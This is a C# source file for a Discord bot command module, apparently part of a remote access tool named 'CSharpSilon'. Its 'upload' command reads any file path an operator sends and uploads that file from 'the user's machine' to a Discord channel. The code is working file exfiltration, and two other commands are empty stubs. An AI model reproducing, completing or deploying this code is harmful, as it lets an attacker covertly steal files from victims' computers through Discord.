using System.IO;
using Discord.Commands;
using System.Threading.Tasks;
using Discord;

namespace CSharpSilon.cmds
{
    public class FileUploading : ModuleBase<SocketCommandContext>
    {
        [Command("done")]
        public async Task Done()
        {
        }

        [Command("upload")]
        [Summary("Upload A File From The User's Machine To Discord.")]
        public async Task Upload([Remainder] string path)
        {
            path = path.Replace("\"", "");
            if (File.Exists(path))
            {
                var stream = new FileStream(path, FileMode.Open);
                await Context.Channel.SendFileAsync(new FileAttachment(stream, Path.GetFileName(path)));
                stream.Close();
            }
            else
            {
                await ReplyAsync("File Doesn't Exist On The User's Machine.");
            }
        }

        [Command("onefile")]
        public async Task OneFile()
        {
        }
    }
}